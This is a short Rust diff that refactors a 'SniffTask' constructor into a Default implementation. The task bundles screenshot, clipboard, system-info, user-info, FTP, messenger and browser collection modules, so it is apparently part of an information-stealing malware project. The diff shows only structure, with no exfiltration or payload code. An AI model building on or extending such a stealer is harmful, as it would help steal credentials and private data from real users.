@@ -24,8 +24,8 @@ pub struct SniffTask<C: Collector> {
     inner: CompositeTask<C>
 }
 
-impl<C: Collector + 'static> SniffTask<C> {
-    pub fn new() -> Self {
+impl<C: Collector + 'static> Default for SniffTask<C> {
+    fn default() -> Self {
         Self {
             inner: composite_task!(
                 ScreenshotTask,
@@ -33,9 +33,9 @@ impl<C: Collector + 'static> SniffTask<C> {
                 SystemInfoTask,
                 ClipboardTask,
                 UserInfoTask,
-                FtpTask::new(),
-                MessengersTask::new(),
-                BrowsersTask::new(),
+                FtpTask::default(),
+                MessengersTask::default(),
+                BrowsersTask::default(),
             )
         }
     }
